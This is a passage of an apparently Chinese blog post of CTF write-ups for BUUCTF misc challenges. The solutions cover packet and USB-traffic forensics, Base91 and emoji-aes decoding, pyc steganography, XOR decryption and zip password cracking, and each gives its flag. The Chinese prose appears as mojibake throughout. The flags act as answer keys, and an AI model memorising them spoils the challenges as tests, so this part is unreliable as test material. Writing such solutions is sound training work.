å°†æµé‡åŒ…ä¸­ TCP æµé‡çš„ Identification æå–å‡ºæ¥å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">0x00000040</span><br><span class="line">0x00000069</span><br><span class="line">0x00000048</span><br><span class="line">0x0000003c</span><br><span class="line">0x0000002c</span><br><span class="line">0x0000007b</span><br><span class="line">0x0000002a</span><br><span class="line">0x0000003b</span><br><span class="line">0x0000006f</span><br><span class="line">0x00000055</span><br><span class="line">0x00000070</span><br><span class="line">0x0000002f</span><br><span class="line">0x00000069</span><br><span class="line">0x0000006d</span><br><span class="line">0x00000022</span><br><span class="line">0x00000051</span><br><span class="line">0x00000050</span><br><span class="line">0x0000006c</span><br><span class="line">0x00000060</span><br><span class="line">0x00000079</span><br><span class="line">0x00000052</span><br><span class="line">0x0000002a</span><br><span class="line">0x00000069</span><br><span class="line">0x00000065</span><br><span class="line">0x0000007d</span><br><span class="line">0x0000004e</span><br><span class="line">0x0000004b</span><br><span class="line">0x0000003b</span><br><span class="line">0x0000002e</span><br><span class="line">0x00000044</span><br><span class="line">0x00000021</span><br><span class="line">0x00000058</span><br><span class="line">0x00000075</span><br><span class="line">0x00000029</span><br><span class="line">0x00000062</span><br><span class="line">0x0000003a</span><br><span class="line">0x0000004a</span><br><span class="line">0x0000005b</span><br><span class="line">0x00000052</span><br><span class="line">0x0000006a</span><br><span class="line">0x0000002b</span><br><span class="line">0x00000036</span><br><span class="line">0x0000004b</span><br><span class="line">0x0000004b</span><br><span class="line">0x0000004d</span><br><span class="line">0x00000037</span><br><span class="line">0x00000050</span><br><span class="line">0x00000040</span><br><span class="line">0x00000069</span><br><span class="line">0x00000048</span><br><span class="line">0x0000003c</span><br><span class="line">0x0000002c</span><br><span class="line">0x0000007b</span><br><span class="line">0x0000002a</span><br><span class="line">0x0000003b</span><br><span class="line">0x0000006f</span><br><span class="line">0x00000055</span><br><span class="line">0x00000070</span><br><span class="line">0x0000002f</span><br><span class="line">0x00000069</span><br><span class="line">0x0000006d</span><br><span class="line">0x00000022</span><br><span class="line">0x00000051</span><br><span class="line">0x00000050</span><br><span class="line">0x0000006c</span><br><span class="line">0x00000060</span><br><span class="line">0x00000079</span><br><span class="line">0x00000052</span><br></pre></td></tr></table></figure><p> ä½¿ç”¨å¦‚ä¸‹çš„ Cyberchef Receipt å¤„ç†ä¸Šè¿°å†…å®¹å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Simple string&#39;,&#39;string&#39;:&#39;0x000000&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">From_Hex(&#39;Auto&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@iH&lt;,&#123;*;oUp&#x2F;im&quot;QPl&#96;yR*ie&#125;NK;.D!Xu)b:J[Rj+6KKM7P@iH&lt;,&#123;*;oUp&#x2F;im&quot;QPl&#96;yR</span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°å­—ç¬¦ä¸²å¾ªç¯çš„éƒ¨åˆ†å»é™¤åä½¿ç”¨ Base 91 è§£ç å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;wMt84iS06mCbbfuOfuVXCZ8MSsAFN1GA&#125;</span><br></pre></td></tr></table></figure><h3 id="RoarCTF2019-davinci-cipher"><a href="#RoarCTF2019-davinci-cipher" class="headerlink" title="[RoarCTF2019]davinci_cipher"></a>[RoarCTF2019]davinci_cipher</h3><p>ä½¿ç”¨ Wireshark åˆ†ææµé‡åŒ…å¯å¾—å…¶ä¸­å«æœ‰è®¾å¤‡ <code>Wacom Intuos Pro M</code> çš„ USB æµé‡ã€‚ä½¿ç”¨ <code>tshark.exe -r k3y.pcapng -T fields -e usb.capdata &gt; data.txt</code> å°†å…¶æå–å‡ºæ¥åç­›é€‰å‡ºæ•°ä½æ¿çš„æµé‡ã€‚å¯¹ç…§ USB åè®®çš„æ–‡æ¡£å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹æè¿°ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1621654053931/a22f74a4d5840d1cf60c8fd67490bb66b82bf3d7.png"></p><p>å› æ­¤å†™ä¸ªè„šæœ¬å°†æµé‡ä¸­çš„åæ ‡è¡¨ç¤ºå‡ºæ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;F:/CTFs/2021/Archived/BUUCTF Misc/[RoarCTF2019]davinci_cipher/data.txt&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">347</span>, <span class="number">239</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    x0 = <span class="built_in">int</span>(line[<span class="number">4</span>:<span class="number">6</span>], <span class="number">16</span>)</span><br><span class="line">    x1 = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">    x = x0 + x1 * <span class="number">256</span></span><br><span class="line">    y0 = <span class="built_in">int</span>(line[<span class="number">10</span>:<span class="number">12</span>], <span class="number">16</span>)</span><br><span class="line">    y1 = <span class="built_in">int</span>(line[<span class="number">12</span>:<span class="number">14</span>], <span class="number">16</span>)</span><br><span class="line">    y = y0 + y1 * <span class="number">256</span></span><br><span class="line">    x //= <span class="number">100</span></span><br><span class="line">    y //= <span class="number">100</span></span><br><span class="line">    image.putpixel((x, -y), (<span class="number">16</span>, <span class="number">63</span>, <span class="number">145</span>))</span><br><span class="line">image = image.transpose(Image.FLIP_TOP_BOTTOM)</span><br><span class="line">image.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1621656757299/6f80769ab21b654cfda45887e0b0a37ecf0a9d23.png"></p><p>å°† flag.txt ä¸­çš„å­—ç¬¦ä¸²ç»è¿‡ Unicode è§£ç åå¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğŸ™ƒğŸ’µğŸŒ¿ğŸ¤ğŸšªğŸŒğŸğŸ¥‹ğŸš«ğŸ˜†ğŸƒğŸ¦“âœ‰ğŸŒ¿ğŸ“‚â˜ƒğŸ‘‰ğŸ›©âœ…ğŸ…âŒ¨ğŸŒğŸ›©ğŸš¨ğŸ¤£ğŸ’§ğŸƒğŸğŸ˜â„¹ğŸ“‚ğŸš«ğŸ‘£ğŸ˜€ğŸ‘£ğŸ™ƒğŸ¤âŒ¨ğŸ˜ğŸ¤£ğŸ¤ğŸ•¹ğŸ‘‘ğŸšªğŸ´ğŸ•¹ğŸ˜‡ğŸ´ğŸâœ…âœ‰ğŸŒâ©ğŸğŸš¨â˜€ğŸ˜‡ğŸ¹ğŸ‘ğŸ‘£âœ‰ğŸŒŠğŸš¨âœ–</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>MONA_LISA_IS_A_MAN</code> ä½œä¸º key è§£ emoji-aes å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RoarCTF&#123;wm-m0de3n_dav1chi&#125;</span><br></pre></td></tr></table></figure><h3 id="NPUCTF2020-HappyCheckInVerification"><a href="#NPUCTF2020-HappyCheckInVerification" class="headerlink" title="[NPUCTF2020]HappyCheckInVerification"></a>[NPUCTF2020]HappyCheckInVerification</h3><p>å°†é™„ä»¶çš„æ–‡ä»¶å°¾ä»æ–‡ä»¶å¤´éƒ¨ç§»å›å»åä¿®æ­£æ–‡ä»¶çš„ä¼ªåŠ å¯†ï¼Œå¯ä»¥è§£å‹å¾—åˆ°ä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ªè§†é¢‘ã€‚å°†ç¼ºå°‘å®šä½ç‚¹çš„äºŒç»´ç ä¿®å¤å¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;this_is_not_flag&#125;ä¸‰æ›³æ‰€è«³é™€æ€¯è€¶å—å¤œç¼½å¾—é†¯æ€¯å‹æ•¸ä¸çŸ¥å–ç›§ç‘Ÿä¾„ç›¡é æ•…éš¸æ€¯è–©ä¸å¨‘ç¾¯æ¶…å†¥ä¼Šç›§è€¶è«³æåº¦å¥¢é“ç›§å†¥ä»¥æœ‹ç½°æ‰€å³æ —è«³è’™é›†çš¤å¤·å¤œé›†è«³åˆ©é¡›å‘å¯«ç„¡æ€¯ä¾å¥¢ç«Ÿ#ï¿¥#%E68BBFE4BD9BE68B89E6A0BCE79A84E5A7BFE58ABFE59CA8E69C80E5908E32333333||254333254242254338254342254231254338254345254432254238254643254236254145254239254441254437254234254232254131254236254245253244253244254343254438254330254341254336254435.sadwq#asdsadasf faf$use$dasdasdafafa_$ba##se64$</span><br></pre></td></tr></table></figure><p>å°†å†…å®¹ä¾æ¬¡è§£ç å¯åœ¨ä¸­é—´éƒ¨åˆ†æ‰¾åˆ°é‡è¦æç¤º <code>æ‹¿ä½›æ‹‰æ ¼çš„å§¿åŠ¿åœ¨æœ€å2333</code>ï¼Œè€Œå­—ç¬¦ä¸²çš„æœ€åæœ‰ <code>use base64</code> çš„æç¤ºã€‚å°†è§†é¢‘ä¸­çš„ DTMF éŸ³é¢‘å¤„ç†åå¯å¾— 448070885ã€‚ä¹‹åçš„æ­¥éª¤å¤§æ¦‚æ˜¯å‘å‡ºé¢˜äººè·å– hint åä»å…¬ä¼—å·è·å¾—ä¸€ä»½éŸ³é¢‘ã€‚è¿™é‡Œä»åˆ«çš„å¸ˆå‚…çš„ WriteUp ä¸Šè·å¾—äº†è¿™ä»½éŸ³é¢‘ï¼Œä½¿ç”¨ RX-SSTV æ¥æ”¶å¯å¾—ä¸‹å›¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1621658082831/e2007e77314f61d42e35676b57e595b84dfe401a.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;miSc_ChecK_In_Ver16ied&#125;</span><br></pre></td></tr></table></figure><h3 id="XMAN2018æ’ä½èµ›-ppap"><a href="#XMAN2018æ’ä½èµ›-ppap" class="headerlink" title="[XMAN2018æ’ä½èµ›]ppap"></a>[XMAN2018æ’ä½èµ›]ppap</h3><p>Wireshark æ‰“å¼€æµé‡åŒ…ï¼Œè·Ÿè¸ªåˆ° TCP æµ 6 å¯ä»¥è·å¾—ä¸€ä¸² Base64ï¼Œå°†å…¶åˆ†æ®µååˆ†åˆ«è§£ç å¯ä»¥å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œä¸€ä¸ª xml æ–‡ä»¶ï¼Œä¸€ä¸ªåŠ å¯†çš„åŒ…å« flag çš„å‹ç¼©åŒ…ï¼Œä»¥åŠå¦‚ä¸‹æç¤ºã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yaaaaaaaar, land ho!Hey wesley, you got that flag?Ayy, I got yer files right here, matey!</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">And here be the map to the booty!</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I don&#39;t understand, this isn&#39;t even a ma-Yarrrr, the booty be buried by that which the map points to! (no spaces and no caps)Ayy, now I be off. But remember, the factor of scales be 1.02, and the neighborly sorts be limited to 50! Lastly, if ye sail the seven seas, you do be a pirate!</span><br></pre></td></tr></table></figure><p>å°†å›¾ç‰‡ foremost ä¹‹åå¯ä»¥å¾—åˆ°å¾ˆå¤šå›¾ç‰‡ï¼Œæ ¹æ®æç¤ºå¯ä»¥çŸ¥é“éœ€è¦æ‰¾ä¸€å¼  <code>pirate</code> çš„å›¾ç‰‡ã€‚å¾ˆå®¹æ˜“å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1621660945039/ec44261c82e86cd28e5bf71b14d53d3e6091c03e.png"></p><p>ä½†æ˜¯æˆ‘æ²¡æ‡‚ä¸ºå•¥è§£å‹å¯†ç å°±æ˜¯ <code>skullandcrossbones</code> äº†ã€‚è§£å‹ä¸Šè¿°å¾—åˆ°çš„å‹ç¼©æ–‡æ¡£å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b31Ng_4_P1r4tE_1s_4lR1GHT_w1Th_M3&#125;</span><br></pre></td></tr></table></figure><h3 id="SUCTF2018-dead-z3r0"><a href="#SUCTF2018-dead-z3r0" class="headerlink" title="[SUCTF2018]dead_z3r0"></a>[SUCTF2018]dead_z3r0</h3><p>å°†é™„ä»¶çš„å¤´éƒ¨çš„å­—ç¬¦ä¸²åˆ é™¤ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ª pyc æ–‡ä»¶ï¼Œå°†å…¶åç¼–è¯‘å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python 3.6 (3379)</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># Compiled at: 2018-11-01 06:20:56</span></span><br><span class="line"><span class="comment">#Powered by BugScaner</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryt</span>(<span class="params">key, plain</span>):</span></span><br><span class="line">    cipher = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        cipher += <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]) ^ <span class="built_in">ord</span>(plain[i]))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPlainText</span>():</span></span><br><span class="line">    plain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;plain.txt&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            line = f.readline()</span><br><span class="line">            <span class="keyword">if</span> line:</span><br><span class="line">                plain += line</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    key = <span class="string">&#x27;LordCasser&#x27;</span></span><br><span class="line">    plain = getPlainText()</span><br><span class="line">    cipher = encryt(key, plain)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cipher.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">        f.write(cipher.encode(<span class="string">&#x27;base_64&#x27;</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>å°†ä¹‹å‰åˆ é™¤çš„ Base64 å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œå†™ä¸€æ®µé€†ç®—æ³•è§£ç å†…å®¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryt</span>(<span class="params">key, cipher</span>):</span></span><br><span class="line">    plain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    cipher = base64.b64decode(cipher)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        plain += <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]) ^ cipher[i])</span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    key = <span class="string">&#x27;LordCasser&#x27;</span></span><br><span class="line">    cipher = <span class="string">&quot;KTswVQk1OgQrOgUVODAKFikZJAUuKzwPCTUxMQE1Kxc8NxYYPjcgQwY7OxMhCzFDLyYFGBYjKwkXMDALAScZEycyJgooOigHEAoSDT42IEcBLCcdDiUxBi8mBRgoLBUKPgowBR04P1QnJj0cLyYFGBYjJBs5JywFL1wjHhkbMkI8KhoWFjAWXH55&quot;</span></span><br><span class="line">    plain = decryt(key, cipher)</span><br><span class="line">    plain = base64.b64decode(plain).decode()</span><br><span class="line">    <span class="built_in">print</span>(urllib.parse.unquote(plain))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">y0u 4r3 f00l3d</span><br><span class="line">th15 15 n0t that y0u want</span><br><span class="line">90 0n dud3</span><br><span class="line">c4tch th3 st3g05auru5</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Stegosaurus å¯¹ pyc æ–‡ä»¶è§£éšå†™å¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;Z3r0_fin411y_d34d&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸€è·¯åˆ°åº•"><a href="#ä¸€è·¯åˆ°åº•" class="headerlink" title="ä¸€è·¯åˆ°åº•"></a>ä¸€è·¯åˆ°åº•</h3><p>å†™ä¸ªè„šæœ¬éå†æ–‡ä»¶å°†å†…å®¹å–å‡ºå¹¶è½¬åŒ–ä¸ºå¯¹åº”æ ¼å¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;F:/CTFs/2021/Archived/BUUCTF Misc/ä¸€è·¯åˆ°åº•/38ff11ef-e3d3-4f8a-b163-3d300bc016ea/files/start.txt&quot;</span>).read()</span><br><span class="line"><span class="built_in">next</span> = data[-<span class="number">36</span>:]</span><br><span class="line">result += <span class="string">&quot;&#123;:04x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(data[<span class="number">0</span>:data.find(<span class="string">&#x27;:&#x27;</span>) - <span class="number">1</span>]))</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(count, <span class="built_in">next</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = <span class="built_in">open</span>(<span class="string">f&quot;F:/CTFs/2021/Archived/BUUCTF Misc/ä¸€è·¯åˆ°åº•/38ff11ef-e3d3-4f8a-b163-3d300bc016ea/files/<span class="subst">&#123;<span class="built_in">next</span>&#125;</span>&quot;</span>).read()</span><br><span class="line">        <span class="built_in">next</span> = data[-<span class="number">36</span>:]</span><br><span class="line">        result += <span class="string">&quot;&#123;:04x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(data[<span class="number">0</span>:data.find(<span class="string">&#x27;:&#x27;</span>) - <span class="number">1</span>]))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(count, <span class="built_in">next</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;F:/CTFs/2021/Archived/BUUCTF Misc/ä¸€è·¯åˆ°åº•/38ff11ef-e3d3-4f8a-b163-3d300bc016ea/result.txt&quot;</span>, <span class="string">&quot;w&quot;</span>).write(result)</span><br></pre></td></tr></table></figure><p>åå…­è¿›åˆ¶è½¬æ¢ä¸€æ¬¡å¯ä»¥å¾—åˆ°ä¸€ä¸ªå‹ç¼©æ–‡æ¡£ï¼Œçˆ†ç ´å…¶å¯†ç å¯ä»¥å¾—åˆ°è§£å‹å¯†ç ä¸º <code>tgb678</code>ã€‚å‹ç¼©åŒ…è§£å‹å¯å¾—ä¸€å¼ å›¾ç‰‡ï¼Œä¿®æ­£æ–‡ä»¶å¤´åæ‰“å¼€å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0c6b489ca956e2fd94dce12be4bf0729&#125;</span><br></pre></td></tr></table></figure><h3 id="b01lers2020-minecraft-purdue"><a href="#b01lers2020-minecraft-purdue" class="headerlink" title="[b01lers2020]minecraft_purdue"></a>[b01lers2020]minecraft_purdue</h3><p>å°†å­˜æ¡£å¯¼å…¥æ¸¸æˆå†…ï¼Œå¯åŠ¨æ¸¸æˆå¯ä»¥è¿›å…¥åœ°å›¾ã€‚åœ¨é—¨å£æ‰¾åˆ°å¦‚ä¸‹æç¤ºã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1621671181667/8f442d81fa4b38d25a91f19c2c77b6ea4e4d7ad6.png"></p><p>å¯ä»¥åœ¨ä¸€æ ‹å»ºç­‘å†…æ‰¾åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1621671303218/775d735fb70333d210e671df7d0bcc737d507d46.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pctf&#123;M1NE&#125;</span><br></pre></td></tr></table></figure><h3 id="NPUCTF2020-ç­¾åˆ°"><a href="#NPUCTF2020-ç­¾åˆ°" class="headerlink" title="[NPUCTF2020]ç­¾åˆ°"></a>[NPUCTF2020]ç­¾åˆ°</h3><p>æ ¹æ®çº¢çŸ³ç¯çš„äº®ä¸ç­æ¥å¾—åˆ°å¦‚ä¸‹æ‘©æ–¯ç”µç ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..---..-.--....-..---..-</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹çš„ Cyberchef Receipt æ¥å¤„ç†å¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Simple string&#39;,&#39;string&#39;:&#39;.&#39;&#125;,&#39;0&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Simple string&#39;,&#39;string&#39;:&#39;-&#39;&#125;,&#39;1&#39;,true,false,true,false)</span><br><span class="line">From_Binary(&#39;Space&#39;,8)</span><br><span class="line">MD5()</span><br><span class="line">To_Upper_case(&#39;All&#39;)</span><br><span class="line">To_Upper_case(&#39;All&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8F108D05D23041B5866F9CB2FF109661&#125;</span><br></pre></td></tr></table></figure><h3 id="HackIM2020-ZeldaInSpace"><a 